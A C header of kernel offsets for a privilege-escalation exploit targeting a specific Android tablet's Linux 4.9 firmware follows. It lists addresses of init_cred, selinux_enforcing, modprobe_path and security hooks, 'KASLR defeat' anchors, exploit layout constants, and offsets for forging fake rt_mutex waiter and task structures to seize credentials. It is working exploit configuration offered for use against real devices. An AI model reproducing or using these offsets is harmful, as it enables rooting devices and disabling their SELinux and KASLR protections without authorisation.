/* SPDX-License-Identifier: GPL-3.0-or-later */
/*
 * KC-T302DT (JUSTSYSTEMS SZJ202) offset.h
 * Firmware: 1.110JS.0151.a (Android Security Patch: 2021-10-01)
 * Kernel:   Linux 4.9.112-perf #1 SMP PREEMPT Thu Sep 22 00:52:58 JST 2022
 * CPU:      APQ8017 (ARM64, 4K pages, VA_BITS=39)
 * Source:   recovery.img extracted from OTA zip
 *           (SZJ202_1.100JS.0142.a_user_to_1.110JS.0151.a_user.zip)
 *
 * NOTE: PSELECT_WAITER_WORD_SHIFT requires runtime measurement on device.
 *       SELINUX_BLOB_SIZES does not exist in kernel 4.9 (use 0 / disable).
 *       boot kernel may differ from recovery kernel - verify on device via
 *       /proc/version before use.
 */

#ifndef OFFSET_H
#define OFFSET_H

/* ── Image base & KASLR ─────────────────────────────────────────────── */
#define KIMAGE_TEXT_BASE        0xffffff8008080000ULL
#define KASLR_ALIGN             0x00200000ULL
#define KASLR_MASK              (KASLR_ALIGN - 1)

/* ── Physical memory layout (APQ8017) ───────────────────────────────── */
#define P0_PAGE_OFFSET          0xffffff8000000000ULL
#define P0_PHYS_OFFSET          0x80000000ULL
#define P0_KERNEL_PHYS_LOAD     0x80080000ULL
#define P0_KERNEL_PHYS_DELTA    (P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET)
#define DIRECT_MAP_BASE         P0_PAGE_OFFSET

/* ── Runtime-measured (TODO: fill in after device measurement) ──────── */
/*
 * PSELECT_WAITER_WORD_SHIFT: measure with timing side-channel on device.
 * Typical value is 16 for 4.x kernels but must be confirmed.
 */
#define PSELECT_WAITER_WORD_SHIFT   16   /* UNCONFIRMED - measure on device */
#define SLIDE_PSELECT_WORD_SHIFT    PSELECT_WAITER_WORD_SHIFT

/* ── SELinux (4.9: no blob_sizes) ───────────────────────────────────── */
#define HAVE_SELINUX_BLOB_SIZES     0
#define SELINUX_HAS_BLOB_SIZES      0
#define SELINUX_BLOB_SIZES_OFF      0x0ULL

/* ── Raw image offsets, relative to KIMAGE_TEXT_BASE ───────────────── */

/* Data symbols */
#define INIT_TASK_OFF               0x1d7ec00ULL
#define INIT_CRED_OFF               0x1ba9360ULL
#define ROOT_TASK_GROUP_OFF         0x1ba9900ULL
#define SELINUX_ENFORCING_OFF       0x1bdf768ULL
#define SECURITY_HOOK_HEADS_OFF     0x14a0380ULL
#define FAIR_SCHED_CLASS_OFF        0x1d7f680ULL
#define KMALLOC_CACHES_OFF          0x1dabc20ULL
#define ANON_PIPE_BUF_OPS_OFF       0x00f9c800ULL
#define MODPROBE_PATH_OFF           0x1ba8050ULL
#define __PER_CPU_OFFSET_OFF        0x1b89020ULL
#define __ENTRY_TASK_PCPU_OFF       0x16084d0ULL   /* per-cpu static offset */

/* ashmem */
#define ASHMEM_MISC_OFF             0x1ca9cf8ULL   /* struct miscdevice ashmem_misc */
#define ASHMEM_MISC_FOPS_OFF        0x1ca9d08ULL   /* &ashmem_misc.fops (ptr location) */
#define ASHMEM_FOPS_OFF             0x18652e8ULL   /* relocation table (runtime resolved) */

/* Function symbols */
#define NOOP_LLSEEK_OFF             0x001a99c0ULL
#define NO_LLSEEK_OFF               0x001a99c8ULL
#define COPY_SPLICE_READ_OFF        0x001e03f4ULL   /* generic_file_splice_read */

/* configfs (4.9: read_file/write_file, not read_iter/write_iter) */
#define CONFIGFS_READ_FILE_OFF      0x0023ebc0ULL
#define CONFIGFS_WRITE_FILE_OFF     0x0023f154ULL
#define CONFIGFS_READ_BIN_FILE_OFF  0x0023ece8ULL
#define CONFIGFS_WRITE_BIN_FILE_OFF 0x0023ee1cULL
#define CONFIGFS_READ_OFF           CONFIGFS_READ_FILE_OFF
#define CONFIGFS_WRITE_OFF          CONFIGFS_WRITE_FILE_OFF
#define CONFIGFS_READ_ITER_OFF      CONFIGFS_READ_FILE_OFF
#define CONFIGFS_BIN_WRITE_ITER_OFF CONFIGFS_WRITE_BIN_FILE_OFF

/* ashmem file_operations */
#define ASHMEM_LLSEEK_OFF           0x00a85a4cULL
#define ASHMEM_READ_ITER_OFF        0x00a85998ULL   /* ashmem_read (no read_iter in 4.9) */
#define ASHMEM_IOCTL_OFF            0x00a85c40ULL
#define ASHMEM_COMPAT_IOCTL_OFF     0x00a8625cULL
#define ASHMEM_MMAP_OFF             0x00a8565cULL
#define ASHMEM_OPEN_OFF             0x00a855d8ULL
#define ASHMEM_RELEASE_OFF          0x00a862acULL

/* SLIDE anchors for KASLR defeat */
#define SLIDE_NFULNL_LOGGER_OFF     0x1b88708ULL   /* nfulnl_logger ptr */
#define SLIDE_LOGGERS_0_1_OFF       0x1b90c50ULL   /* nf_loggers[0][0] */
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x1c32470ULL /* sysctl_bootid buffer */
#define SLIDE_SYSCTL_BOOTID_OFF     0x0166e4a8ULL  /* ctl_table boot_id entry */
#define SLIDE_INIT_TASK_OFF         INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF   ROOT_TASK_GROUP_OFF

/* ── Absolute image addresses ────────────────────────────────────────── */
#define INIT_TASK               (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define INIT_CRED               (KIMAGE_TEXT_BASE + INIT_CRED_OFF)
#define ROOT_TASK_GROUP         (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING       (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SELINUX_BLOB_SIZES      (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#define SECURITY_HOOK_HEADS     (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#define FAIR_SCHED_CLASS        (KIMAGE_TEXT_BASE + FAIR_SCHED_CLASS_OFF)
#define KMALLOC_CACHES          (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS       (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define MODPROBE_PATH           (KIMAGE_TEXT_BASE + MODPROBE_PATH_OFF)
#define ASHMEM_MISC             (KIMAGE_TEXT_BASE + ASHMEM_MISC_OFF)
#define ASHMEM_MISC_FOPS        (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS             (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define NOOP_LLSEEK             (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define NO_LLSEEK               (KIMAGE_TEXT_BASE + NO_LLSEEK_OFF)
#define COPY_SPLICE_READ        (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define CONFIGFS_READ_FILE      (KIMAGE_TEXT_BASE + CONFIGFS_READ_FILE_OFF)
#define CONFIGFS_WRITE_FILE     (KIMAGE_TEXT_BASE + CONFIGFS_WRITE_FILE_OFF)
#define ASHMEM_LLSEEK           (KIMAGE_TEXT_BASE + ASHMEM_LLSEEK_OFF)
#define ASHMEM_READ_ITER        (KIMAGE_TEXT_BASE + ASHMEM_READ_ITER_OFF)
#define ASHMEM_IOCTL            (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL     (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP             (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN             (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE          (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define SLIDE_NFULNL_LOGGER_IMAGE   (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE     (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA   (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_SYSCTL_BOOTID         (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)
#define SLIDE_INIT_TASK_IMAGE       (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)

/* ── Exploit layout constants ────────────────────────────────────────── */
#define LOCK_OFF                0x1350
#define W0_OFF                  0x2220
#define FOPS_OFF                0x1000
#define SCRATCH_OFF             0x3000
#define FAKE_TASK_OFF           0x3200
#define WAITER_LOCAL_OFF        0x80

/* ── rt_mutex struct offsets ─────────────────────────────────────────── */
#define RTMUTEX_WAIT_LOCK_OFF           0x00
#define RTMUTEX_WAIT_LOCK_OWNER_CPU_OFF 0x04
#define RTMUTEX_WAIT_LOCK_OWNER_TASK_OFF 0x08
#define RTMUTEX_WAITERS_ROOT_OFF        0x10
#define RTMUTEX_WAITERS_LEFTMOST_OFF    0x18
#define RTMUTEX_OWNER_OFF               0x20

/* ── rt_mutex_waiter offsets (kernel 4.9 FLAT struct, differs from 6.x) */
/*
 * 4.9 layout: tree_entry(rb_node,0x18) + pi_tree_entry(rb_node,0x18)
 *             + task*(8) + lock*(8) + prio(4)+pad(4) + deadline(8)
 * 6.x added rt_waiter_node intermediate struct - NOT present here.
 */
#define WAITER_TREE_ENTRY_OFF       0x00
#define WAITER_PI_TREE_ENTRY_OFF    0x18
#define WAITER_TASK_OFF             0x30
#define WAITER_LOCK_OFF             0x38
#define WAITER_PRIO_OFF             0x40
#define WAITER_DEADLINE_OFF         0x48
#define FAKE_WAITER_TREE_ENTRY_OFF  WAITER_TREE_ENTRY_OFF
#define FAKE_WAITER_PI_TREE_ENTRY_OFF WAITER_PI_TREE_ENTRY_OFF
#define FAKE_WAITER_TASK_OFF        WAITER_TASK_OFF
#define FAKE_WAITER_LOCK_OFF        WAITER_LOCK_OFF
#define FAKE_WAITER_PRIO_OFF        WAITER_PRIO_OFF
#define FAKE_WAITER_DEADLINE_OFF    WAITER_DEADLINE_OFF

/* ── task_struct field offsets ───────────────────────────────────────── */
#define TASK_PRIO_OFF               0x70
#define TASK_REAL_PARENT_OFF        0x688
#define TASK_PIDS_OFF               0x6f0   /* pids[PIDTYPE_PID].pid */
#define TASK_REAL_CRED_OFF          0x830
#define TASK_CRED_OFF               0x838
#define TASK_COMM_OFF               0x8f0
#define TASK_PI_LOCK_OFF            0x8f4
#define TASK_PI_WAITERS_OFF         0x8f8
#define TASK_PI_BLOCKED_ON_OFF      0x910

/* ── FAKE_TASK field offsets (mirrors task_struct fields used by exploit) */
#define FAKE_TASK_PRIO_OFF          TASK_PRIO_OFF
#define FAKE_TASK_PI_LOCK_OFF       TASK_PI_LOCK_OFF
#define FAKE_TASK_PI_WAITERS_OFF    TASK_PI_WAITERS_OFF
#define FAKE_TASK_PI_BLOCKED_ON_OFF TASK_PI_BLOCKED_ON_OFF
#define FAKE_TASK_REAL_CRED_OFF     TASK_REAL_CRED_OFF
#define FAKE_TASK_CRED_OFF          TASK_CRED_OFF

#define TARGET_CONFIG_H             1

#endif /* OFFSET_H */